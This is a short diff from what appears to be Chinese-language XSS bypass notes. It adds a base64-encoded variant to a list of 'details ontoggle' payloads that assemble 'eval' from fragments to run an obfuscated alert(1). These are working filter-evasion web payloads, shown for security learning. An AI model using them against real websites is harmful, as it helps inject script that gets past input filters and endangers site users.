@@ -67,6 +67,7 @@
 也可以选择将`alert(1)`编码，因为有eval存在啊，直接拿来用
 
 ```
+<details open ontoggle=top[a='al',b='ev',b%2ba](atob('YWxlcnQoMSk='))>
 <details open ontoggle=top[a='al',b='ev',b%2ba]('\141\154\145\162\164\50\61\51')>
 <details open ontoggle=top[a='al',b='ev',b%2ba]('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')>
 ```
